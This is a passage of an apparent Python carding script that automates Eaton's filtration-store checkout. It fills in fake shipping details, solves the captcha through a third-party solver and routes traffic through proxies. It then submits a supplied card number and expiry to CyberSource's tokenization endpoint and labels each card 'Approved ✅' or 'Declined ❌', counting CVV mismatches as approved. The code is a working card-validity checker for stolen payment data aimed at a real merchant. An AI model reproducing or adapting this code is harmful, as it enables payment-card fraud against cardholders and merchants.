                ('/atg/commerce/order/purchase/CartModifierFormHandler.selectedIntermediateAddId', ''),
                ('_D:/atg/commerce/order/purchase/CartModifierFormHandler.selectedIntermediateAddId', ' '),
                ('/atg/commerce/order/purchase/CartModifierFormHandler.defaultAddressId', ''),
                ('_D:/atg/commerce/order/purchase/CartModifierFormHandler.defaultAddressId', ' '),
                ('carrierId', ''),
                ('freightId', ''),
                ('modeId', '3900002'),
                ('/atg/commerce/order/purchase/CartModifierFormHandler.selectedShipmentFlag', ''),
                ('_D:/atg/commerce/order/purchase/CartModifierFormHandler.selectedShipmentFlag', ' '),
                ('/atg/commerce/order/purchase/CartModifierFormHandler.shippingAddressSelected', ''),
                ('_D:/atg/commerce/order/purchase/CartModifierFormHandler.shippingAddressSelected', ' '),
                ('/atg/commerce/order/purchase/CartModifierFormHandler.selectedIntermediateAddId', ''),
                ('_D:/atg/commerce/order/purchase/CartModifierFormHandler.selectedIntermediateAddId', ' '),
                ('shippingCountryValue', 'MX'),
                ('_D:shippingCountryValue', ' '),
                ('shippingStateValue', 'MX_MEX'),
                ('_D:shippingStateValue', ' '),
                ('/atg/commerce/order/purchase/CartModifierFormHandler.addCarrierAndShippingModesSuccessURL', '/store/order/payment/payment.jsp'),
                ('_D:/atg/commerce/order/purchase/CartModifierFormHandler.addCarrierAndShippingModesSuccessURL', ' '),
                ('/atg/commerce/order/purchase/CartModifierFormHandler.addCarrierAndShippingModesErrorURL', '/store/order/shippingAddress.jsp'),
                ('_D:/atg/commerce/order/purchase/CartModifierFormHandler.addCarrierAndShippingModesErrorURL', ' '),
                ('/atg/commerce/order/purchase/CartModifierFormHandler.inputPONumber', ''),
                ('_D:/atg/commerce/order/purchase/CartModifierFormHandler.inputPONumber', ' '),
                ('/atg/commerce/order/purchase/CartModifierFormHandler.guestUser', 'true'),
                ('_D:/atg/commerce/order/purchase/CartModifierFormHandler.guestUser', ' '),
                ('/atg/commerce/order/purchase/CartModifierFormHandler.addressInfo.firstName', 'Juan'),
                ('_D:/atg/commerce/order/purchase/CartModifierFormHandler.addressInfo.firstName', ' '),
                ('/atg/commerce/order/purchase/CartModifierFormHandler.addressInfo.lastName', 'Perez'),
                ('_D:/atg/commerce/order/purchase/CartModifierFormHandler.addressInfo.lastName', ' '),
                ('/atg/commerce/order/purchase/CartModifierFormHandler.addressInfo.companyName', 'gfdvd 453'),
                ('_D:/atg/commerce/order/purchase/CartModifierFormHandler.addressInfo.companyName', ' '),
                ('/atg/commerce/order/purchase/CartModifierFormHandler.addressInfo.address1', 'CALLE LEANDRO VALLE 2'),
                ('_D:/atg/commerce/order/purchase/CartModifierFormHandler.addressInfo.address1', ' '),
                ('/atg/commerce/order/purchase/CartModifierFormHandler.addressInfo.address2', 'Pbo ATIZAPAN CENTRO'),
                ('_D:/atg/commerce/order/purchase/CartModifierFormHandler.addressInfo.address2', ' '),
                ('/atg/commerce/order/purchase/CartModifierFormHandler.addressInfo.address3', ''),
                ('_D:/atg/commerce/order/purchase/CartModifierFormHandler.addressInfo.address3', ' '),
                ('/atg/commerce/order/purchase/CartModifierFormHandler.addressInfo.address4', ''),
                ('_D:/atg/commerce/order/purchase/CartModifierFormHandler.addressInfo.address4', ' '),
                ('/atg/commerce/order/purchase/CartModifierFormHandler.addressInfo.city', 'Ciudad Adolfo López Mateos'),
                ('_D:/atg/commerce/order/purchase/CartModifierFormHandler.addressInfo.city', ' '),
                ('/atg/commerce/order/purchase/CartModifierFormHandler.addressInfo.state', 'MX_MEX'),
                ('_D:/atg/commerce/order/purchase/CartModifierFormHandler.addressInfo.state', ' '),
                ('/atg/commerce/order/purchase/CartModifierFormHandler.addressInfo.postalCode', '52900'),
                ('_D:/atg/commerce/order/purchase/CartModifierFormHandler.addressInfo.postalCode', ' '),
                ('/atg/commerce/order/purchase/CartModifierFormHandler.addressInfo.country', 'MX'),
                ('_D:/atg/commerce/order/purchase/CartModifierFormHandler.addressInfo.country', ' '),
                ('/atg/commerce/order/purchase/CartModifierFormHandler.addressInfo.email', ''),
                ('_D:/atg/commerce/order/purchase/CartModifierFormHandler.addressInfo.email', ' '),
                ('/atg/commerce/order/purchase/CartModifierFormHandler.addressInfo.phoneNumber', ''),
                ('_D:/atg/commerce/order/purchase/CartModifierFormHandler.addressInfo.phoneNumber', ' '),
                ('/atg/commerce/order/purchase/CartModifierFormHandler.addCarrierAndShippingModes', 'submit'),
                ('_D:/atg/commerce/order/purchase/CartModifierFormHandler.addCarrierAndShippingModes', ' '),
                ('_DARGS', '/store/order/singleShippingMethod.jsp.shipMethod'),
            ]

            response = await session.post('https://filtration-store.eaton.com/store/order/shippingAddress.jsp?_DARGS=/store/order/singleShippingMethod.jsp.shipMethod', headers=headers, data=data,proxy=proxy)
            r5 = await response.text()

            with open("CybChase5.html", "w", encoding="utf-8") as f:
                f.write(r5)

            
            captcha = await CaptchaSolver.Solverv2(SITE_KEY, "https://filtration-store.eaton.com/")

            headers = {
                'accept': '*/*',
                'accept-language': 'es-419,es;q=0.8',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                # Requests sorts cookies= alphabetically
                # 'cookie': f"dtCookie=v_4_srv_7_sn_C31025CA78D7CE0B97A8C2C4EF275369_perc_100000_ol_0_mul_1_app-3A7a8a77c77fcc9d6f_1; JSESSIONID=l5LLKa2y8Ueyl4DInE5xjkbuyqD0kOWUIn4t7iNkz3Rj1BV64E5X!1567055205; TS01927ad8=01861a5e092f4d98cbd11b68f1a49dbae357b7aca215fdc63da41d140f0b14bb87d8d95fe667470057ea82d48512270efd94bc013d3a8a32e2ee233c58161772279b3e26e8; rxVisitor=1725690390230V5HU37SKRK7BGGK0UCPEURJ2R8T79FQ2; ak_bmsc=2835FC8E7F4097A75D3ACA5C16ECAEEE~000000000000000000000000000000~YAAQJh3VFxVUF8GRAQAAaLMpyxmQHoot/wiGJID1hAxTA3in+Kv8bnNBb+tGOT8BvFZx+tcXozN9JIIyju2qVaMeDshPn4DoclL0JwMVCLa3XWGdPsZqBWc6D4UksXlIQVApiXOmulrGwj5Q5gXUdAwoouL9KeKoLrRkBHyFUXyWe9VerMMk0rz4A3L2vp0T4kusb9hna4ZJ2PEyu0kVDYBB1/TruOd+Kxaj/sZNQYBMFz5iDWLKpR+6NfFKSAOqyVqCCTq2BuQbaO0Y1uPqyanmlmxJTXq+6q1ZWzEdZTBsTbPDBDzXVMaDVsDtCFLarzSvoUR1XWj/WIEMJyS1KX386lCLe6Oaih7nxI/xr0ID0FvRaF5tRgkFZZOD4KdPtctuzRNBYwiA/w==; bm_sv=CB1337F7A46A5003E008A86460859033~YAAQJh3VFypUF8GRAQAALrYpyxm4JyWkjNkURjhugzSN0qqswzn+Mn6DlcOeLPtbozDlOp4A5OBSibhdrnfaR1QqOJt7qyzmVGiEY5zWbi71e5XZ+gM1rG9uHZ/QoaP8t0JsRlx0HRiCQ1xGB0XhOjJ966h4EyrX37Pvmt9+8djWBSWHw+jNNC6E771ZSm83yxNPij/CX0y2Y8PiE8xSNElVsnWtLRSkxSH3MuCmvrIo3aoA0aC8PaEqGsLsCfE=~1; userID=1725690391355_302594998; rxvt=1725692249633|1725690390235; dtPC={90447587_774h-vUEQUPMUCJGMMAHPHDJRRMHPUKTWMHSKL-0e0;} dtSa=true%7CC%7C-1%7CProceed%20to%20Checkout%7C-%7C1725690970673%7C90447587_774%7Chttps%3A%2F%2Ffiltration-store.eaton.com%2Fstore%2Fcheckout%2Fcart.jsp%3F_5Frequestid%3D5307524%7C%7C%7C%7C; TS01d182d0=01861a5e09a5b6c825b04ea49d594ced352074be253341767f769aa3b435007faad0b6d9bbc4dc11b8d19c7eb852d3593533571617f01d58c11b216106a494168d30dcd84c",
                'origin': 'https://filtration-store.eaton.com',
                'priority': 'u=1, i',
                'referer': 'https://filtration-store.eaton.com/store/order/payment/payment.jsp?_requestid=5308038',
                'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }

            data = [
                ('_dyncharset', 'UTF-8'),
                ('_dynSessConf', dynsess),
                ('/atg/commerce/order/purchase/PaymentGroupFormHandler.transactionType', 'create_payment_token'),
                ('_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.transactionType', ' '),
                ('/atg/commerce/order/purchase/PaymentGroupFormHandler.paymentMethod', 'card'),
                ('_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.paymentMethod', ' '),
                ('/atg/commerce/order/purchase/PaymentGroupFormHandler.ccAdminIntermediatePageUrl', 'https://filtration-store.eaton.com:443/store/order/payment/cyberSourceResponse.jsp'),
                ('_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.ccAdminIntermediatePageUrl', ' '),
                ('/atg/commerce/order/purchase/PaymentGroupFormHandler.billingSelectedOption', 'addNewBilling'),
                ('_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.billingSelectedOption', ' '),
                ('/atg/commerce/order/purchase/PaymentGroupFormHandler.addressInfo.firstName', 'dadsasa'),
                ('_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.addressInfo.firstName', ' '),
                ('/atg/commerce/order/purchase/PaymentGroupFormHandler.addressInfo.lastName', 'asadasd'),
                ('_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.addressInfo.lastName', ' '),
                ('sameAsShippingCheckbox', 'on'),
                ('/atg/commerce/order/purchase/PaymentGroupFormHandler.addressInfo.address1', 'CALLE LEANDRO VALLE 2'),
                ('_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.addressInfo.address1', ' '),
                ('/atg/commerce/order/purchase/PaymentGroupFormHandler.addressInfo.address2', ''),
                ('_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.addressInfo.address2', ' '),
                ('/atg/commerce/order/purchase/PaymentGroupFormHandler.addressInfo.city', 'Estado De Mexico'),
                ('_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.addressInfo.city', ' '),
                ('_dyncharset', 'UTF-8'),
                ('_dynSessConf', dynsess),
                ('_D:stateValue', ' '),
                ('stateValue', 'MX_MEX'),
                ('_DARGS', '/store/order/fragments/statesDetailForCredit.jspf.shippingMethodForm'),
                ('billStateID', ''),
                ('/atg/commerce/order/purchase/PaymentGroupFormHandler.addressInfo.postalCode', '52900'),
                ('_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.addressInfo.postalCode', ' '),
                ('_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.addressInfo.country', ' '),
                ('/atg/commerce/order/purchase/PaymentGroupFormHandler.addressInfo.country', 'MX'),
                ('/atg/commerce/order/purchase/PaymentGroupFormHandler.addressInfo.state', 'MEX'),
                ('_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.addressInfo.state', ' '),
                ('/atg/commerce/order/purchase/PaymentGroupFormHandler.addressInfo.email', 'sdfsfs@gmail.com'),
                ('_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.addressInfo.email', ' '),
                ('/atg/commerce/order/purchase/PaymentGroupFormHandler.addressInfo.phoneNumber', '5516321478'),
                ('_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.addressInfo.phoneNumber', ' '),
                ('/atg/commerce/order/purchase/PaymentGroupFormHandler.action', 'create'),
                ('_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.action', ' '),
                ('/atg/commerce/order/purchase/PaymentGroupFormHandler.createSignature', 'proceedToReviewFromPayment'),
                ('_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.createSignature', ' '),
                ('/atg/commerce/order/purchase/PaymentGroupFormHandler.cyberMerchantId', 'etn_filtration'),
                ('_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.cyberMerchantId', ' '),
                ('captchaResponse', captcha),
                ('_DARGS', '/store/order/payment/createCCBillingFragment.jsp.billingFragmentForm'),
            ]

            response = await session.post('https://filtration-store.eaton.com/store/order/payment/payment.jsp?_DARGS=/store/order/payment/createCCBillingFragment.jsp.billingFragmentForm', headers=headers, data=data,proxy=proxy)
            r6 = await response.text()

            reference_number = r6.split('"reference_number":"')[1].split('"')[0]
            signed_date_time = r6.split('"signed_date_time":"')[1].split('"')[0]
            transaction_uuid = r6.split('"transaction_uuid":"')[1].split('"')[0]
            signature = r6.split('"signature":"')[1].split('"')[0]
            one = cc[0:1]
            if one == '4':
                tipo = '001'
            elif one == '5':
                tipo = '002'

            elif one == "3":
                tipo = '003'
            elif one == "6":
                tipo = '004'


            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-419,es;q=0.6',
                'cache-control': 'max-age=0',
                'origin': 'https://filtration-store.eaton.com',
                'priority': 'u=0, i',
                'referer': 'https://filtration-store.eaton.com/',
                'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Brave";v="128"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'cross-site',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
            }

            data = {
                'reference_number': reference_number,
                'amount': '1.00',
                'signed_field_names': 'access_key,profile_id,transaction_uuid,signed_field_names,unsigned_field_names,signed_date_time,locale,transaction_type,reference_number,amount,currency,payment_method,bill_to_forename,bill_to_surname,bill_to_email,bill_to_address_line1,bill_to_address_line2,bill_to_address_city,bill_to_address_state,bill_to_address_country,bill_to_address_postal_code,bill_to_phone,override_custom_receipt_page',
                'profile_id': '6B3C85FF-422D-4F58-AAB6-7EFFBE39C7DB',
                'signed_date_time': signed_date_time,
                'transaction_type': 'create_payment_token',
                'locale': 'en',
                'transaction_uuid': transaction_uuid,
                'access_key': '22570eafb9b03dba8a0c3a55b1ba0a05',
                'unsigned_field_names': 'card_type,card_number,card_expiry_date,card_cvn,merchant_defined_data5',
                'currency': 'USD',
                'override_custom_receipt_page': 'https://filtration-store.eaton.com:443/store/order/payment/cyberSourceResponse.jsp',
                'signature': signature,
                'payment_method': 'card',
                'bill_to_forename': 'dadsasa',
                'bill_to_surname': 'asadasd',
                'bill_to_email': 'sdfsfs@gmail.com',
                'bill_to_phone': '5516321478',
                'bill_to_address_line1': 'CALLE LEANDRO VALLE 2',
                'bill_to_address_line2': '',
                'bill_to_address_city': 'Estado De Mexico',
                'bill_to_address_state': 'MEX',
                'bill_to_address_country': 'MX',
                'bill_to_address_postal_code': '52900',
                'ccType': '002',
                'cardHolderFirstName': 'dadsasa',
                'cardHolderLastName': 'asadasd',
                'card_number': cc,
                'card_expiry_date': [
                    f'{mes}-{ano[2:]}',
                    f'{mes}-{ano}',
                ],
                'card_cvn': '',
                'card_type': tipo,
                'merchant_defined_data5': 'addNewBilling',
            }

            response = await session.post('https://secureacceptance.cybersource.com/silent/token/create', headers=headers, data=data,proxy=proxy)
            r7 = await response.text()
            await session.close()

            if 'Request was processed successfully.' in r7 or 'APPROVAL' in r7 or 'DECLINE' not in r7:
                res = 'Approved ✅'
                mensaje = 'Charged 1$'
            else:
                mensaje = r7.split('id="message" value="')[1].split('"')[0]
                decision = r7.split('id="decision" value="')[1].split('"')[0]
                reason_code = r7.split('id="reason_code" value="')[1].split('"')[0]
                try:
                    auth_code = r7.split('id="auth_response" value="')[1].split('"')[0]
                except:
                    auth_code = ""
                if "Credit Floor" in mensaje :
                    res = 'Approved ✅'
                elif "CVV2" in mensaje:
                    res = 'Approved ✅'
                else:
                    res = 'Declined ❌'

                mensaje = f"{reason_code}: {decision} | {auth_code}: {mensaje} "
            return res, mensaje

        except Exception as e:
            await session.close()
            linea = str(e.__traceback__.tb_lineno)
            print("Error en CyberChase_Charged, la linea: " + linea + " " + str(e))
            res = "$Error_ ⚠️"
            traceback_str = traceback.format_exc()
            mensaje = f"{e} | {traceback_str}"
            return res, mensaje
